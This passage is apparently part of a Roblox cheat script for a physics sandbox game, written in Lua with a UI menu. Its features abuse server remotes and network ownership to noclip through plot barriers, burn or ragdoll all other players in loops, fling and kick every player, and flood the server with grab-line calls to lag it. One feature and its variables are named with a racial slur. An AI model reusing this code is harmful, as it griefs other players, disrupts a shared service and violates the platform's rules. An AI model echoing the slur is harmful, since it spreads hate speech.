                    if Config.tractorGyro then Config.tractorGyro:Destroy() Config.tractorGyro = nil end
                    Config.tractorSpeed = 0
                    return
                end
                local model = seatPart.Parent
                if not model then return end
                local name = model.Name
                if name ~= "TractorGreen" and name ~= "TractorRed" and name ~= "TractorOrange" then
                    if Config.tractorGyro then Config.tractorGyro:Destroy() Config.tractorGyro = nil end
                    Config.tractorSpeed = 0
                    return
                end
                local root = model.PrimaryPart or seatPart
                if not root then return end
                if not Config.tractorGyro or Config.tractorGyro.Parent ~= root then
                    if Config.tractorGyro then Config.tractorGyro:Destroy() end
                    local gyro = Instance.new("BodyGyro")
                    gyro.MaxTorque = Vector3.new(1e6, 0, 1e6)
                    gyro.P = 5e4
                    gyro.D = 5e3
                    gyro.CFrame = root.CFrame
                    gyro.Parent = root
                    Config.tractorGyro = gyro
                end
                local gyroObj = Config.tractorGyro
                local lookVec = root.CFrame.LookVector
                local flatLook = Vector3.new(lookVec.X, 0, lookVec.Z)
                if flatLook.Magnitude > 0 then
                    gyroObj.CFrame = CFrame.new(root.Position, root.Position + flatLook.Unit)
                end
                root.AssemblyAngularVelocity = Vector3.new(0, root.AssemblyAngularVelocity.Y, 0)
                local vel = root.AssemblyLinearVelocity
                local flatVel = Vector3.new(vel.X, 0, vel.Z)
                local throttle = seatPart.Throttle
                local pressing = math.abs(throttle) > 0
                local targetSpeed = pressing and (Config.nitroActive and 300 or 100) or 0
                Config.tractorSpeed = Config.tractorSpeed + (targetSpeed - Config.tractorSpeed) * math.clamp(dt * 4, 0, 1)
                if not pressing then
                    local friction = flatVel.Magnitude > 0.5 and flatVel.Unit * -1 * 80 * dt or Vector3.zero
                    root.AssemblyLinearVelocity = vel + friction
                elseif Config.tractorSpeed > 0.5 then
                    local seatLook = Vector3.new(seatPart.CFrame.LookVector.X, 0, seatPart.CFrame.LookVector.Z)
                    if seatLook.Magnitude > 0 then
                        seatLook = seatLook.Unit
                        local dir = throttle > 0 and seatLook or -seatLook
                        root.AssemblyLinearVelocity = dir * Config.tractorSpeed + Vector3.new(0, vel.Y, 0)
                    end
                end
            end)
        else
            if Config.speedTractorConn then
                Config.speedTractorConn:Disconnect()
                Config.speedTractorConn = nil
            end
            if Config.tractorGyro then Config.tractorGyro:Destroy() Config.tractorGyro = nil end
            Config.tractorSpeed = 0
        end
    end
})

miscOtherSec:AddLabel("Tractor Nitro"):AddKeyPicker("KeyPicker", {
	Default = "RightShift",
    Mode = "Hold",
	WaitForCallback = false,
    Text = "Tractor Nitro23",
    Callback = function(held)
        Config.nitroActive = held
    end
})

miscOtherSec:AddLabel("Tractor Jump"):AddKeyPicker("TractorJump", {
	Default = "",
    Mode = "Press",
	WaitForCallback = false,
    Text = "Tractor Jump23",
    Callback = function()
        local char = GetCharacter()
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hum or not hum.SeatPart or not hum.SeatPart:IsA("VehicleSeat") then return end
        local seatPart = hum.SeatPart
        local model = seatPart.Parent
        if not model then return end
        local name = model.Name
        if name ~= "TractorGreen" and name ~= "TractorRed" and name ~= "TractorOrange" then return end
        local root = model.PrimaryPart or seatPart
        if not root then return end
        root.AssemblyLinearVelocity = Vector3.new(root.AssemblyLinearVelocity.X, 100, root.AssemblyLinearVelocity.Z)
    end
})

BBB:AddButton({
    Text = "Break Barrier",
    Func = function()
        if InPlot.Value and not InOwnedPlot.Value then 
            InPlot:GetPropertyChangedSignal("Value"):Wait()
        end 
        if not CanSpawnToy.Value then 
            CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
        end
        
        local playerCF = PLCF() or CFrame.new()
        local SpawnCF = playerCF * CFrame.new(0, 14, 20)
        task.spawn(spawntoy, "FoodHamburger", SpawnCF, Vector3.zero)
        
        local Hamburger
        if InOwnedPlot.Value then 
            local Plot = CheckForHome()
            Hamburger = Plot and (Plot:FindFirstChild("FoodHamburger") or Plot:WaitForChild("FoodHamburger", 2.5))
        else 
            Hamburger = SpawnedInToys:FindFirstChild("FoodHamburger") or SpawnedInToys:WaitForChild("FoodHamburger", 2.5)
        end

        if not Hamburger then return end
        
        local HoldPart = Hamburger:FindFirstChild("HoldPart") or Hamburger:WaitForChild("HoldPart", 10)
        local GrabItemRemoteFunction = HoldPart and (HoldPart:FindFirstChild("HoldItemRemoteFunction") or HoldPart:WaitForChild("HoldItemRemoteFunction", 10))
        
        if GrabItemRemoteFunction then 
            local oldCF = GetCharacter():GetPivot()
            
            GrabItemRemoteFunction:InvokeServer(Hamburger, GetCharacter())
            GetCharacter():PivotTo(workspace.Plots.Plot3.PlotArea.CFrame)
            task.wait(0.1)
            GetCharacter():PivotTo(oldCF)
            
            DestroyToy:FireServer(Hamburger)
        end 
    end    
})

BBB:AddToggle("BarrierNoclip", {
    Text = "Barrier Noclip",
    Default = false,
    Callback = function(Value)
        local shouldCollide = not Value

        for _, v in ipairs(service.Workspace.Plots:GetChildren()) do
            local b = v:FindFirstChild("Barrier")
            if b then
                for _, p in ipairs(b:GetChildren()) do
                    if p:IsA("BasePart") then
                        p.CanCollide = shouldCollide
                    end
                end
            end
        end
    end
})

Freeeeeeeeee:AddToggle("FireT", {
    Text = "Fire All",
    Default = false,
    Callback = function(Value)
        Config.FireAllT = Value
        if Value then
            task.spawn(function()
                while Config.FireAllT do
                    spawntoy("Campfire", HRP().CFrame * CFrame.new(0, 3, 4), Vector3.zero)
                    local spawnedInToys = service.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
                    local Fireee = spawnedInToys:WaitForChild("Campfire", 3)
                    if not Fireee or not Config.FireAllT then break end
                    Fireee.Name = "CampFireAll"
                    
                    task.wait(.1)
                    if Fireee:FindFirstChild("SoundPart") then
                        SetNetworkOwner:FireServer(Fireee.SoundPart, HRP().CFrame)
                    end
                    while Config.FireAllT and Fireee and Fireee.Parent == spawnedInToys do
                        for _, v in ipairs(service.Players:GetPlayers()) do
                            if not Config.FireAllT or not Fireee or Fireee.Parent ~= spawnedInToys then break end
                            if (v == localPlayer) then continue end
                            if FireAllwhite(v) then continue end
                            local character = v.Character
                            if not character then continue end
                            local root = character:FindFirstChild("HumanoidRootPart")
                            if not root then continue end
                            if Fireee and Fireee:FindFirstChild("SoundPart") then
                                Fireee.SoundPart.CFrame = root.CFrame
                            end
                            task.wait(.1)
                        end
                        task.wait(.05)
                    end
                    if not Config.FireAllT then
                        if Fireee and Fireee.Name == "CampFireAll" then
                            DestroyToy:FireServer(Fireee)
                        end
                        break
                    end
                end
            end)
        end
    end,
})

Freeeeeeeeee:AddToggle("FireWhite", {
    Text = "Whitelist",
    Default = Config.FireallWhitelist,
    Callback = function(Value)
        Config.FireallWhitelist = Value
    end
})

BananaAll:AddToggle("BananaT", {
    Text = "Banana All",
    Default = false,
    Callback = function(Value)
        local char = GetCharacter()
        Config.RagdollAllT = Value 
        if Value then
            task.spawn(function()
                local banana, SoundPart, AlignPos, Atach
                while Config.RagdollAllT do
                    task.wait(0.05)
                    local validTargets = {}
                    for _, targetPlr in ipairs(service.Players:GetPlayers()) do
                        if targetPlr ~= localPlayer 
                           and not ragdolallwhite(targetPlr) 
                           and not IsPlayerInsideSafeZone(targetPlr) 
                           and targetPlr.Character 
                           and targetPlr.Character:FindFirstChild("Left Leg") then
                            table.insert(validTargets, targetPlr)
                        end
                    end
                    if #validTargets == 0 then
                        task.wait(0.5)
                        continue
                    end
                    local targetPlr = validTargets[math.random(1, #validTargets)]
                    local targetLeg = targetPlr.Character:FindFirstChild("Left Leg")
                    local targetAttach = targetLeg and targetLeg:FindFirstChild("LeftFootAttachment")
                    if not targetAttach then continue end
                    if banana and not banana.Parent then
                        banana = nil
                        SoundPart = nil
                    else
                        banana = SpawnedInToys:FindFirstChild("FoodBanana")
                    end
                    SoundPart = banana and banana:FindFirstChild("SoundPart")
                    if not SoundPart then
                        for _, v in pairs(SpawnedInToys:GetChildren()) do 
                            if v.Name == "FoodBanana" then 
                                DestroyToy:FireServer(v)
                            end 
                        end 
                        if InPlot.Value and not InOwnedPlot.Value then 
                            InPlot:GetPropertyChangedSignal("Value"):Wait()
                        end 
                        if not CanSpawnToy.Value then 
                            CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
                        end
                        local hrp = HRP()
                        local SpawnCF = hrp.CFrame * CFrame.new(0, 14, 20)
                        local Container = InOwnedPlot.Value and Config.LastHouse or SpawnedInToys
                        if Container then
                            local spawnedObject = nil
                            local connection = Container.ChildAdded:Connect(function(child)
                                if child.Name == "FoodBanana" then
                                    spawnedObject = child
                                end
                            end)
                            pcall(function()
                                spawntoy("FoodBanana", SpawnCF, Vector3.zero)
                            end)
                            local start = tick()
                            repeat task.wait() until spawnedObject or (tick() - start) > 1.5
                            connection:Disconnect()
                            banana = spawnedObject
                        end
                        if not banana then continue end
                        SoundPart = banana:FindFirstChild("SoundPart") or banana:WaitForChild("SoundPart", 2)
                        if not SoundPart then continue end
                        local holdPart = banana:FindFirstChild("HoldPart") or banana:WaitForChild("HoldPart", 2)
                        if holdPart then
                            local holdRemote = holdPart:FindFirstChild("HoldItemRemoteFunction") or holdPart:WaitForChild("HoldItemRemoteFunction")
                            if holdRemote then holdRemote:InvokeServer(banana, char) end
                        end
                        UseRemote:FireServer(banana)
                        while Config.RagdollAllT and (banana:FindFirstChild("EdiblePart") ~= nil) do task.wait() end
                        if not Config.RagdollAllT then break end
                        UseRemote:FireServer(banana)
                        if holdPart then
                            local dropRemote = holdPart:FindFirstChild("DropItemRemoteFunction") or holdPart:WaitForChild("DropItemRemoteFunction")
                            if dropRemote then dropRemote:InvokeServer(banana, char:GetPivot() * CFrame.new(0, 15, -10), Vector3.zero) end
                        end
                        repeat 
                            SoundPart = banana and banana:FindFirstChild("SoundPart")
                            if not SoundPart then break end 
                            SetNetworkOwner:FireServer(SoundPart, SoundPart.CFrame)
                            task.wait()
                        until not Config.RagdollAllT or not SoundPart or (SoundPart:FindFirstChild("PartOwner") ~= nil)
                        if not Config.RagdollAllT then break end
                        DestroyGrabLine:FireServer(SoundPart)
                        Atach = Instance.new("Attachment")
                        Atach.Parent = SoundPart
                        AlignPos = Instance.new("AlignPosition")
                        AlignPos.MaxForce = math.huge
                        AlignPos.MaxVelocity = math.huge
                        AlignPos.Responsiveness = 200
                        AlignPos.Parent = SoundPart
                        AlignPos.Attachment0 = Atach
                    end
                    local isOwner = true
                    for _, v in pairs(banana:GetChildren()) do 
                        if (v:FindFirstChild("PartOwner") ~= nil) and v["PartOwner"].Value ~= localPlayer.Name then 
                            DestroyToy:FireServer(banana) 
                            banana = nil 
                            isOwner = false
                            break 
                        end
                    end
                    if not isOwner or not banana then continue end
                    AlignPos = SoundPart:FindFirstChild("AlignPosition")
                    if not AlignPos then 
                        DestroyToy:FireServer(banana) 
                        banana = nil 
                        continue 
                    end
                    AlignPos.Attachment1 = targetAttach
                    task.wait(0.3)
                end
                if banana then 
                    if AlignPos then AlignPos:Destroy() end 
                    DestroyToy:FireServer(banana)
                end
            end)
        else
            for _, v in pairs(SpawnedInToys:GetChildren()) do 
                if v.Name == "FoodBanana" then 
                    DestroyToy:FireServer(v)
                end 
            end
        end
    end
})

BananaAll:AddToggle("BananaWhite", {
    Text = "Whitelist",
    Default = Config.RagdollallWhitelist,
    Callback = function(Value)
        Config.RagdollallWhitelist = Value
    end
})

Nigger:AddToggle("NiggerT", {
    Text = "Nigger All",
    Default = false,
    Callback = function(Value)
        Config.NiggerAllT = Value
        if Value then
            task.spawn(function()
                while Config.NiggerAllT do
                    spawntoy("OvenDarkGray", HRP().CFrame * CFrame.new(0, 3, 4), Vector3.zero)
                    local spawnedInToys = service.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
                    local Oven = spawnedInToys:WaitForChild("OvenDarkGray", 3)
                    if not Oven or not Config.NiggerAllT then break end
                    Oven.Name = "BurnOvenDarkGray"
                    local Button = Oven:FindFirstChild("ButtonOven")
                    if Button then
                        SetNetworkOwner:FireServer(Button, HRP().CFrame)
                        DestroyGrabLine:FireServer(Button)
                    end
                    task.wait(.1)
                    if Oven:FindFirstChild("SoundPart") then
                        SetNetworkOwner:FireServer(Oven.SoundPart, HRP().CFrame)
                    end
                    while Config.NiggerAllT and Oven and Oven.Parent == spawnedInToys do
                        for _, v in ipairs(service.Players:GetPlayers()) do
                            if not Config.NiggerAllT or not Oven or Oven.Parent ~= spawnedInToys then break end
                            if (v == localPlayer) then continue end
                            if NiggerWhite(v) then continue end
                            local character = v.Character
                            if not character then continue end
                            local root = character:FindFirstChild("HumanoidRootPart")
                            if not root then continue end
                            if Oven and Oven:FindFirstChild("SoundPart") then
                                Oven.SoundPart.CFrame = root.CFrame
                            end
                            task.wait(.1)
                        end
                        task.wait(.05)
                    end
                    if not Config.NiggerAllT then
                        if Oven and Oven.Name == "BurnOvenDarkGray" then
                            DestroyToy:FireServer(Oven)
                        end
                        break
                    end
                end
            end)
        end
    end,
})

Nigger:AddToggle("NiggerWhite", {
    Text = "Whitelist",
    Default = Config.NiggerWhiteList,
    Callback = function(Value)
        Config.NiggerWhiteList = Value
    end
})

BR:AddToggle("BR", {
    Text = "Bring All",
    Default = false,
    Callback = function(state)
        Config.BringAllToggle = state
        
        if state then
            if Config.cameraAnchor then
                local camera = service.Workspace.CurrentCamera
                if camera and Config.originalCameraSubject then
                    camera.CameraSubject = Config.originalCameraSubject
                end
                Config.cameraAnchor:Destroy()
                Config.cameraAnchor = nil
                Config.originalCameraSubject = nil
            end
            
            coroutine.wrap(function()
                local rootPart = HRP()
                local playerCFrame = rootPart and rootPart.CFrame
                if not playerCFrame then return end

                local camCFrame = CFrame.lookAt(
                    service.Workspace.CurrentCamera.CFrame.Position + Vector3.new(-15, 15, 0),
                    playerCFrame.Position
                )
                service.Workspace.CurrentCamera.CFrame = camCFrame

                while Config.BringAllToggle do
                    local myRoot = HRP()
                    if not myRoot then
                        task.wait()
                    else
                        local myPos = myRoot.Position
                        local underPos = myPos + Vector3.new(0, -3, 0)
                        local abovePos = myPos + Vector3.new(0, 3, 0)

                        myRoot.CFrame = CFrame.new(underPos)

                        if not Config.freezePart then
                            Config.freezePart = Instance.new("Part")
                            Config.freezePart.Anchored = true
                            Config.freezePart.CanCollide = false
                            Config.freezePart.Transparency = 1
                            Config.freezePart.Size = Vector3.new(1, 1, 1)
                            Config.freezePart.Parent = service.Workspace
                        end
                        Config.freezePart.CFrame = CFrame.new(underPos)
                        service.Workspace.CurrentCamera.CameraType = Enum.CameraType.Follow
                        service.Workspace.CurrentCamera.CameraSubject = Config.freezePart

                        for _, player in ipairs(service.Players:GetPlayers()) do
                            local isTargetValid = false
                            
                            if not BringWhite(player) and player.Character then
                                local hum = player.Character:FindFirstChildOfClass("Humanoid")
                                if hum and hum.Health > 0 then
                                    if not IsPlayerInsideSafeZone(player) then
                                        local pRoot = player.Character:FindFirstChild("HumanoidRootPart")
                                        local velMag = pRoot and pRoot.Velocity.Magnitude or 0
                                        if velMag < 20 then
                                            isTargetValid = true
                                        end
                                    end
                                end
                            end

                            if isTargetValid then
                                local root = player.Character:FindFirstChild("HumanoidRootPart")
                                local hum = player.Character:FindFirstChildOfClass("Humanoid")
                                local ragdolled = hum and hum:FindFirstChild("Ragdolled")
                                
                                if root and hum and ragdolled then
                                    for _ = 1, 50 do
                                        if not Config.BringAllToggle then break end
                                        
                                        if not Config.floatConnection then
                                            Config.floatConnection = service.RunService.Stepped:Connect(function()
                                                if (Config.BringAllToggle) and localPlayer.Character then
                                                    for _, part in ipairs(localPlayer.Character:GetDescendants()) do
                                                        if part:IsA("BasePart") then part.CanCollide = false end
                                                    end
                                                end
                                            end)
                                        end
                                        
                                        local snowShipSuccess = false
                                        if root then
                                            if root:FindFirstChild("PartOwner") and root.PartOwner.Value == localPlayer.Name then
                                                snowShipSuccess = true
                                            else
                                                local localRoot = HRP()
                                                if SetNetworkOwner and localRoot then
                                                    SetNetworkOwner:FireServer(root, CFrame.lookAt(localRoot.Position, root.Position))
                                                end
                                                for _ = 1, 5 do
                                                    task.wait()
                                                    if root:FindFirstChild("PartOwner") and root.PartOwner.Value == localPlayer.Name then
                                                        snowShipSuccess = true
                                                        break
                                                    end
                                                end
                                            end
                                        end

                                        if CNWOSHIPOPl(player) then
                                            if not ragdolled.Value and player:DistanceFromCharacter(myPos) > 10 then
                                                root.CFrame = CFrame.new(abovePos)
                                            end
                                            
                                            local bp = root:FindFirstChild("BringBody")
                                            if not bp then
                                                bp = Instance.new("BodyPosition")
                                                bp.Name = "BringBody"
                                                bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                                bp.D = 5000
                                                bp.P = 1500000
                                                bp.Parent = root
                                            end
                                            bp.Position = abovePos
                                            break
                                        end

                                        task.wait()
                                        local localRoot = HRP()
                                        if localRoot then
                                            if root.Position.Y <= -9 then
                                                localRoot.CFrame = CFrame.new(root.Position + Vector3.new(0, 5, -15))
                                            else
                                                localRoot.CFrame = CFrame.new(root.Position + Vector3.new(0, 5, 5))
                                            end
                                        end
                                    end
                                end
                            end
                        end

                        local localRoot = HRP()
                        if localRoot then localRoot.CFrame = CFrame.new(underPos) end
                    end
                    task.wait()
                end

                local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
                if hum then service.Workspace.CurrentCamera.CameraSubject = hum end
                service.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
                
                if Config.floatConnection then
                    Config.floatConnection:Disconnect()
                    Config.floatConnection = nil
                end
                
                local localRoot = HRP()
                if localRoot then localRoot.CFrame = playerCFrame end
            end)()
        else
            local hum = localPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then service.Workspace.CurrentCamera.CameraSubject = hum end
            service.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
            
            if Config.floatConnection then
                Config.floatConnection:Disconnect()
                Config.floatConnection = nil
            end
        end
    end,
})

BR:AddToggle("BRWhite", {
    Text = "WhiteList",
    Default = Config.gewgsgvwe,
    Callback = function(Value)
        Config.gewgsgvwe = Value
    end
})

Lag:AddToggle("LineLagT", {
    Text = "Line Lag server",
    Default = false,
    Callback = function(Value)
        if Value then
            if Config.LineLagToggle then return end
            Config.LineLagToggle = true
            Config.LineLagCoro = coroutine.create(function()
                if not CreateGrabLine then return end
                while Config.LineLagToggle do
                    local spawnLocation = service.Workspace:FindFirstChild("SpawnLocation") 
                        or service.Workspace:FindFirstChild("Spawn") 
                        or (localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart"))

                    if spawnLocation then
                        local randomX = math.random(-1e9, 1e9)
                        local randomZ = math.random(-1e9, 1e9)
                        local directions = {
                            CFrame.new(randomX, 0, randomZ), 
                            CFrame.new(-randomX, 0, -randomZ), 
                            CFrame.new(randomX, 0, -randomZ), 
                            CFrame.new(-randomX, 0, randomZ)
                        }
                        for _, pos in pairs(directions) do 
                            CreateGrabLine:FireServer(spawnLocation, pos) 
                        end
                    end
                    task.wait()
                end
            end)
            coroutine.resume(Config.LineLagCoro)
        else
            Config.LineLagToggle = false
            if Config.LineLagCoro then
                coroutine.close(Config.LineLagCoro)
                Config.LineLagCoro = nil
            end
        end
    end,
})

Lag:AddToggle("Crazy", {
    Text = "Crazy Line",
    Default = false,
    Callback = function(state)
        Config.CrazyLineLag = state
        if state then
            task.spawn(function()
                while Config.CrazyLineLag do
                    for _, player in pairs(service.Players:GetPlayers()) do
                        if not Config.CrazyLineLag then break end
                        if player ~= localPlayer and player.Character then
                            local torso = player.Character:FindFirstChild("Torso")
                            if torso then
                                CreateGrabLine:FireServer(
                                    torso,
                                    CFrame.new(
                                        0.12640380859375,
                                        0.9606337547302246,
                                        -0.5000009536743164,
                                        0.9985212683677673,
                                        0,
                                        -0.05436277016997337,
                                        -6.4805472099749295e-9,
                                        1,
                                        -1.1903301100346653e-7,
                                        0.05436277016997337,
                                        5.960464477539063e-8,
                                        0.9985212683677673
                                    )
                                )
                            end
                        end
                    end
                    task.wait()
                end
            end)
        end
    end
})


Groundkick:AddButton({
    Text = "Ground kick",
    Func = function()
        local hrp
        if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
            hrp = localPlayer.Character.HumanoidRootPart
        else
            local character = localPlayer.CharacterAdded:Wait()
            hrp = character:WaitForChild("HumanoidRootPart")
        end
        if not hrp then return end
        local container
        if not workspace.PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) then
            container = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
        else
            for _, v in pairs(workspace.Plots:GetChildren()) do
                local sign = v:FindFirstChild("PlotSign")
                local owners = sign and sign:FindFirstChild("ThisPlotsOwners")
                if owners then
                    for _, b in pairs(owners:GetChildren()) do
                        if b.Value == localPlayer.Name then
                            local folder = workspace.PlotItems:FindFirstChild(v.Name)
                            if folder then
                                container = folder
                                break
                            end
                        end
                    end
                end
                if container then break end
            end
        end
        if not container then
            container = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
        end
        if not container then return end
        local rayParams = RaycastParams.new()
        rayParams.FilterDescendantsInstances = {localPlayer.Character}
        rayParams.FilterType = Enum.RaycastFilterType.Exclude
        local result = workspace:Raycast(hrp.Position, Vector3.new(0, -15, 0), rayParams)
        local targetPart = result and result.Instance
        if not (targetPart and targetPart:IsA("BasePart") and not targetPart:IsA("Terrain")) then
            return
        end
        local canSpawn = localPlayer:WaitForChild("CanSpawnToy")
        if not canSpawn.Value or not SpawnToyRemoteFunction then return end
        local preExisting = {}
        for _, child in pairs(container:GetChildren()) do
            if child.Name == "NinjaShuriken" then
                table.insert(preExisting, child)
            end
        end
        local success, newShuriken = pcall(function()
            SpawnToyRemoteFunction:InvokeServer("NinjaShuriken", hrp.CFrame * CFrame.new(0, 2, 8), Vector3.new(0,0,0))
            local startTime = tick()
            while tick() - startTime < 2 do
                for _, child in pairs(container:GetChildren()) do
                    if child.Name == "NinjaShuriken" and not table.find(preExisting, child) then
                        return child
                    end
                end
                task.wait()
            end
            return nil
        end)

        if not success or not newShuriken then return end
        local soundPart = newShuriken:FindFirstChild("SoundPart") or newShuriken:WaitForChild("SoundPart", 0.1)
        if soundPart and SetNetworkOwner then
            pcall(function()
                SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
            end)
        end
        if newShuriken:FindFirstChild("StickyPart") and StickyPartEvent then
            pcall(function()
                StickyPartEvent:FireServer(
                    newShuriken.StickyPart,
                    targetPart,
                    CFrame.new(0, -2.3e+09, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
                )
            end)
        end
    end
})

KickallNoblob:AddButton({
    Text = "Kick All (Blob)",
    Callback = function()
        task.spawn(function()
            local allPlayers = {}
            for _, player in ipairs(service.Players:GetPlayers()) do
                if isTargetable(player) then
                    table.insert(allPlayers, player)
                end
            end
            if #allPlayers == 0 then
                return
            end
            if not Config.lineLagConkickall then
                Config.lineLagConkickall = true
                Config.lineLagkickall = coroutine.create(function()
                    while Config.lineLagConkickall do
                        local spawnLocation = service.Workspace:FindFirstChild("SpawnLocation") 
                            or service.Workspace:FindFirstChild("Spawn") 
                            or (localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart"))
                        if spawnLocation then
                            local randomX = math.random(-2e9, 2e9)
                            local randomZ = math.random(-2e9, 2e9)
                            local directions = {
                                CFrame.new(randomX, 0, randomZ), 
                                CFrame.new(-randomX, 0, -randomZ), 
                                CFrame.new(randomX, 0, -randomZ), 
                                CFrame.new(-randomX, 0, randomZ)
                            }
                            for _, pos in pairs(directions) do 
                                pcall(function() CreateGrabLine:FireServer(spawnLocation, pos) end)
                            end
                        end
                        task.wait()
                    end
                end)
                coroutine.resume(Config.lineLagkickall)
            end
            local playerStatusKickAll = {}
            for _, targetPlayer in ipairs(allPlayers) do
                playerStatusKickAll[targetPlayer.UserId] = "Targeting"
            end
            local char = localPlayer.Character
            local rootPart = char and char:FindFirstChild("HumanoidRootPart")
            if not rootPart then
                Config.lineLagConkickall = false
                if Config.lineLagkickall then
                    coroutine.close(Config.lineLagkickall)
                    Config.lineLagkickall = nil
                end
                return
            end
            local myPosition = rootPart.Position
            local targetHeight = myPosition.Y + Config.KickallHeight
            local spawnPos = rootPart.CFrame * CFrame.new(0, 0, -5)
            pcall(function()
                SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", spawnPos, Vector3.new(0, 127, 0))
            end)
            task.wait(0.8)
            local toyFolder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
            local currentBlob = toyFolder and toyFolder:FindFirstChild("CreatureBlobman")
            if not currentBlob then
                Config.lineLagConkickall = false
                if Config.lineLagkickall then
                    coroutine.close(Config.lineLagkickall)
                    Config.lineLagkickall = nil
                end
                return
            end
            local vehicleSeat = currentBlob:FindFirstChild("VehicleSeat")
            if vehicleSeat and localPlayer.Character then
                pcall(function()
                    vehicleSeat:Sit(localPlayer.Character:FindFirstChildOfClass("Humanoid"))
                end)
            end
            task.wait(0.6)
            local myRoot = rootPart
            if not myRoot then
                Config.lineLagConkickall = false
                if Config.lineLagkickall then
                    coroutine.close(Config.lineLagkickall)
                    Config.lineLagkickall = nil
                end
                return
            end
            for _, targetPlayer in ipairs(allPlayers) do
                local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    myRoot.CFrame = targetRoot.CFrame
                    task.wait(0.03)
                    for i = 1, 3 do
                        pcall(function()
                            currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(
                                currentBlob.LeftDetector, targetRoot, currentBlob.LeftDetector.LeftWeld
                            )
                            task.wait(0.02)
                            currentBlob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(currentBlob.LeftDetector.LeftWeld)
                            currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(
                                currentBlob.RightDetector, targetRoot, currentBlob.RightDetector.RightWeld
                            )
                            task.wait(0.02)
                            currentBlob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(currentBlob.RightDetector.RightWeld)
                        end)
                        task.wait(0.03)
                    end
                end
            end
            myRoot.CFrame = CFrame.new(myPosition.X, targetHeight + 10, myPosition.Z)
            task.wait(0.1)
            local radius = Config.kickallRadius
            local centerX = myPosition.X
            local centerZ = myPosition.Z
            local playerCount = #allPlayers
            local angleStep = (math.pi * 2) / playerCount
            for i, targetPlayer in ipairs(allPlayers) do
                local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    local angle = (i - 1) * angleStep + math.random(-0.05, 0.05)
                    local actualRadius = radius + math.random(-0.3, 0.3)
                    local x = centerX + actualRadius * math.cos(angle)
                    local z = centerZ + actualRadius * math.sin(angle)
                    local y = targetHeight + math.random() * 0.3
                    targetRoot.CFrame = CFrame.new(x, y, z)
                    targetRoot.AssemblyLinearVelocity = Vector3.zero
                    targetRoot.AssemblyAngularVelocity = Vector3.zero
                    local bp = Instance.new("BodyPosition")
                    bp.MaxForce = Vector3.new(1e9, 1e9, 1e9)
                    bp.P = 40000000
                    bp.Position = Vector3.new(x, y, z)
                    bp.Parent = targetRoot
                    task.delay(1.5, function() pcall(function() bp:Destroy() end) end)
                    task.wait(0.02)
                end
            end
            task.wait(0.1)
            for _ = 1, 2 do
                for _, targetPlayer in ipairs(allPlayers) do
                    local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if targetRoot then
                        task.spawn(function()
                            pcall(function()
                                SetNetworkOwner:FireServer(targetRoot, CFrame.new(targetRoot.Position))
                                DestroyGrabLine:FireServer(targetRoot)
                                CreateGrabLine:FireServer(targetRoot, CFrame.new(0, 1e9, 0))
                            end)
                        end)
                    end
                end
                task.wait(0.05)
            end
            task.wait(0.1)
            for _ = 1, 2 do
                for _, targetPlayer in ipairs(allPlayers) do
                    local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if targetRoot then
                        task.spawn(function()
                            pcall(function()
                                currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(
                                    currentBlob.LeftDetector, targetRoot, currentBlob.LeftDetector.LeftWeld
                                )
                                task.wait(0.02)
                                currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(
                                    currentBlob.RightDetector, targetRoot, currentBlob.RightDetector.RightWeld
                                )
                                task.wait(0.02)
                                currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(
                                    currentBlob.LeftDetector, targetRoot, currentBlob.LeftDetector.LeftWeld
                                )
                                currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(
                                    currentBlob.RightDetector, targetRoot, currentBlob.RightDetector.RightWeld
                                )
                            end)
                        end)
                    end
                end
                task.wait(0.05)
            end
            task.wait(0.1)
            for _, targetPlayer in ipairs(allPlayers) do
                if targetPlayer and targetPlayer.Parent == service.Players then
                    playerStatusKickAll[targetPlayer.UserId] = "Kicked"
                end
            end
            myRoot.CFrame = CFrame.new(myPosition.X, myPosition.Y - 5, myPosition.Z)
            for _, part in ipairs(currentBlob:GetDescendants()) do
                if part:IsA("BasePart") then 
                    pcall(function() part.Anchored = false end) 
                end
            end
            task.wait(0.5)
            Config.lineLagConkickall = false
            if Config.lineLagkickall then
                coroutine.close(Config.lineLagkickall)
                Config.lineLagkickall = nil
            end
        end)
    end
})

KickallNoblob:AddToggle("WhitelistKickall", {
    Text = "Whitelist Friends",
    Default = false,
    Callback = function(Value)
        Config.WhitelistKickall = Value
    end,
})

KickallNoblob:AddButton({
    Text = "Stop Lag",
    Callback = function()
        Config.lineLagConkickall = false
        if Config.lineLagkickall then
            pcall(function() coroutine.close(Config.lineLagkickall) end)
            Config.lineLagkickall = nil
        end
    end
})

